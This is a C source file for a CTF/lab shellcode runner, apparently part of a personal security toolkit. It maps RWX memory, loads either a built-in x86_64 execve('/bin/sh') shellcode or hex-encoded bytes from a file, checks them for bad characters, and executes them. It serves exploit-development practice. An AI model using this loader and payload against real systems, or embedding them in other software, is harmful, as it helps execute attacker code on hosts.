/*
 * shellcode_runner.c — Execute raw shellcode in-process (CTF/lab only)
 * NuRichter · CySec Arsenal
 *
 * Allocates RWX memory, copies shellcode, and executes it.
 * Use only in isolated CTF lab environments.
 *
 * Build:
 *   gcc -o shellcode_runner shellcode_runner.c -z execstack -no-pie
 *   # or with mprotect (no execstack needed):
 *   gcc -o shellcode_runner shellcode_runner.c
 *
 * Usage:
 *   ./shellcode_runner
 *   ./shellcode_runner <hex_file>    # file containing hex-encoded shellcode
 *
 * WARNING: This is a research/CTF tool. Run only in a sandboxed environment.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

/* ─── Default execve('/bin/sh') shellcode (x86_64 Linux) ─────────────────── */
static const unsigned char default_sc[] = {
    /* xor rdi, rdi              */ 0x48, 0x31, 0xFF,
    /* push rdi                  */ 0x57,
    /* mov rsi, '/bin//sh'       */ 0x48, 0xBE,
                                    0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x2F, 0x73, 0x68,
    /* push rsi                  */ 0x56,
    /* mov rdi, rsp              */ 0x48, 0x89, 0xE7,
    /* xor rsi, rsi              */ 0x48, 0x31, 0xF6,
    /* xor rdx, rdx              */ 0x48, 0x31, 0xD2,
    /* mov rax, 59               */ 0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00,
    /* syscall                   */ 0x0F, 0x05,
};

/* ─── Helpers ────────────────────────────────────────────────────────────── */

static void print_hex(const unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (i % 16 == 0) printf("\n  %04zx: ", i);
        printf("%02x ", data[i]);
    }
    printf("\n");
}

/* Parse hex string "90909090..." → bytes */
static size_t hex_decode(const char *hex, unsigned char *out, size_t max_out) {
    size_t out_len = 0;
    while (*hex && *(hex+1) && out_len < max_out) {
        while (*hex == ' ' || *hex == '\\' || *hex == 'x' || *hex == '\n')
            hex++;
        if (!*hex || !*(hex+1)) break;
        char byte_str[3] = { hex[0], hex[1], 0 };
        out[out_len++] = (unsigned char)strtoul(byte_str, NULL, 16);
        hex += 2;
    }
    return out_len;
}

static void *alloc_rwx(size_t size) {
    void *mem = mmap(
        NULL, size,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0
    );
    if (mem == MAP_FAILED) {
        perror("mmap");
        return NULL;
    }
    return mem;
}

static int analyse_shellcode(const unsigned char *sc, size_t len) {
    int has_null   = 0;
    int has_syscall = 0;
    int has_newline = 0;

    for (size_t i = 0; i < len; i++) {
        if (sc[i] == 0x00) has_null = 1;
        if (sc[i] == 0x0a) has_newline = 1;
        if (i + 1 < len && sc[i] == 0x0f && sc[i+1] == 0x05) has_syscall = 1;
        if (i + 1 < len && sc[i] == 0xcd && sc[i+1] == 0x80) has_syscall = 1;
    }

    printf("[*] Analysis:\n");
    printf("    Length   : %zu bytes\n", len);
    printf("    NULL bytes  : %s\n", has_null    ? "YES (may break strcpy exploits)" : "None ✓");
    printf("    \\n bytes    : %s\n", has_newline ? "YES (may break gets() exploits)" : "None ✓");
    printf("    Syscall    : %s\n", has_syscall ? "Found ✓" : "Not detected");
    return 0;
}

/* ─── Main ───────────────────────────────────────────────────────────────── */

int main(int argc, char *argv[]) {
    const unsigned char *sc  = default_sc;
    size_t               len = sizeof(default_sc);
    unsigned char        sc_buf[4096];

    printf("╔══════════════════════════════════════════╗\n");
    printf("║  Shellcode Runner — NuRichter CySec       ║\n");
    printf("║  FOR CTF / LAB USE ONLY                   ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    /* Load shellcode from file if provided */
    if (argc > 1) {
        FILE *f = fopen(argv[1], "r");
        if (!f) {
            perror("fopen");
            return 1;
        }
        char hex_buf[8192] = {0};
        size_t n = fread(hex_buf, 1, sizeof(hex_buf) - 1, f);
        fclose(f);
        len = hex_decode(hex_buf, sc_buf, sizeof(sc_buf));
        if (len == 0) {
            fprintf(stderr, "[-] Failed to decode shellcode from file.\n");
            return 1;
        }
        sc = sc_buf;
        printf("[+] Loaded shellcode from: %s\n", argv[1]);
    } else {
        printf("[*] Using built-in execve('/bin/sh') shellcode\n");
    }

    printf("[*] Shellcode hex dump:");
    print_hex(sc, len);
    printf("\n");
    analyse_shellcode(sc, len);

    /* Allocate RWX page */
    void *mem = alloc_rwx(len);
    if (!mem) return 1;

    memcpy(mem, sc, len);
    printf("\n[*] Shellcode at: %p\n", mem);
    printf("[*] Executing shellcode...\n\n");
    fflush(stdout);

    /* Execute */
    typedef void (*sc_fn)(void);
    sc_fn fn = (sc_fn)mem;
    fn();

    munmap(mem, len);
    return 0;
}
